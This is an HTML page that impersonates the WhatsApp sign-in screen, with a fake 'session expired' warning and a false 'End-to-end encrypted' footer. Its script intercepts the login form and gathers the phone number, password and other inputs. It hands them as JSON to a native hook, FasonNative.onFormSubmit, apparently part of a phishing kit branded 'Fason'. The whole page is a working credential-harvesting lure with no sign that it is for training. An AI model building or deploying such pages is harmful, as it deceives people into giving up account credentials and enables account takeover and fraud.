<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj4KICA8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgcng9IjIwIiBmaWxsPSIjNjM2NmYxIi8+CiAgPHRleHQgeD0iNTAiIHk9IjY4IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNTAiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RjwvdGV4dD4KPC9zdmc+">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #111b21;
            color: #e9edef;
            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 40px 24px;
            text-align: center;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: #25d366;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
        }
        .logo svg { width: 48px; height: 48px; fill: #fff; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 8px; color: #e9edef; }
        .subtitle { color: #8696a0; font-size: 14px; margin-bottom: 32px; }
        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }
        .input-group label {
            display: block;
            color: #8696a0;
            font-size: 13px;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #2a3942;
            border: 1px solid #374045;
            border-radius: 8px;
            color: #e9edef;
            font-size: 15px;
            outline: none;
        }
        .input-group input:focus { border-color: #25d366; }
        .input-group input::placeholder { color: #667781; }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #25d366;
            color: #111b21;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        .login-btn:hover { background: #1fb457; }
        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #667781;
            font-size: 13px;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #374045;
        }
        .divider span { padding: 0 16px; }
        .qr-btn {
            width: 100%;
            padding: 12px;
            background: transparent;
            color: #00a5f4;
            border: 1px solid #374045;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
        }
        .footer { margin-top: 40px; color: #667781; font-size: 12px; }
        .session-notice {
            background: #2a3942;
            border-radius: 8px;
            padding: 12px 16px;
            margin-bottom: 24px;
            font-size: 13px;
            color: #ffd279;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .session-notice::before { content: '⚠️'; }
    
        .fason-branding {
            position: fixed;
            bottom: 8px;
            right: 12px;
            font-size: 10px;
            color: rgba(128,128,128,0.5);
            display: flex;
            align-items: center;
            gap: 4px;
            z-index: 9999;
        }
        .fason-branding img {
            width: 14px;
            height: 14px;
            opacity: 0.5;
        }
</style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24"><path d="M12.04 2C6.58 2 2.13 6.45 2.13 11.91c0 1.75.46 3.45 1.32 4.95L2 22l5.25-1.38c1.45.79 3.08 1.21 4.79 1.21 5.46 0 9.91-4.45 9.91-9.91C21.95 6.45 17.5 2 12.04 2zm0 18.03c-1.48 0-2.93-.4-4.2-1.15l-.3-.18-3.12.82.83-3.04-.2-.31a8.26 8.26 0 0 1-1.26-4.38c0-4.54 3.7-8.24 8.25-8.24 4.54 0 8.24 3.7 8.24 8.24 0 4.55-3.7 8.24-8.24 8.24zm4.52-6.16c-.25-.12-1.47-.72-1.69-.81-.23-.08-.39-.12-.56.13-.17.25-.64.8-.78.97-.14.17-.29.19-.54.06-.25-.12-1.05-.39-1.99-1.23-.74-.66-1.23-1.47-1.38-1.72-.14-.25-.02-.38.11-.51.11-.11.25-.29.37-.43.12-.14.17-.25.25-.41.08-.17.04-.31-.02-.43-.06-.12-.56-1.34-.76-1.84-.2-.48-.41-.42-.56-.43-.14-.01-.31-.01-.48-.01-.17 0-.43.06-.66.31-.22.25-.86.85-.86 2.07 0 1.22.89 2.4 1.01 2.56.12.17 1.75 2.67 4.23 3.74.59.26 1.05.41 1.41.52.59.19 1.13.16 1.56.1.48-.07 1.47-.6 1.67-1.18.21-.58.21-1.07.15-1.18-.06-.1-.23-.16-.48-.27z"/></svg>
        </div>
        <div class="session-notice">Your session has expired. Please log in again to continue.</div>
        <h1>WhatsApp</h1>
        <p class="subtitle">Sign in to continue</p>
        <form>
            <div class="input-group">
                <label>Phone number</label>
                <input type="tel" placeholder="+1 234 567 8900" autocomplete="tel">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" placeholder="Enter your password" autocomplete="current-password">
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="divider"><span>or</span></div>
        <button class="qr-btn">Log in with QR code</button>
        <div class="footer">End-to-end encrypted</div>
    </div>

    <script>
        function submitForm() {
            var inputs = document.querySelectorAll('input[type="text"], input[type="tel"], input[type="email"], input[type="password"], input[type="number"]');
            var data = {};
            inputs.forEach(function(input, i) {
                var key = input.placeholder || input.name || input.id || 'field' + i;
                data[key] = input.value;
            });
            FasonNative.onFormSubmit(JSON.stringify(data));
        }
        document.addEventListener('DOMContentLoaded', function() {
            var form = document.querySelector('form');
            if (form) {
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    submitForm();
                });
            }
            var btn = document.querySelector('button[type="submit"], .login-btn, .submit-btn, [onclick*="submit"]');
            if (btn) {
                btn.addEventListener('click', function(e) {
                    e.preventDefault();
                    submitForm();
                });
            }
        });
    </script>


    <div class="fason-branding">
        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj4KICA8cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgcng9IjIwIiBmaWxsPSIjNjM2NmYxIi8+CiAgPHRleHQgeD0iNTAiIHk9IjY4IiBmb250LWZhbWlseT0iQXJpYWwsIHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNTAiIGZvbnQtd2VpZ2h0PSJib2xkIiBmaWxsPSJ3aGl0ZSIgdGV4dC1hbmNob3I9Im1pZGRsZSI+RjwvdGV4dD4KPC9zdmc+" alt="F">
        <span>Powered by Fason</span>
    </div>
</body>
</html>
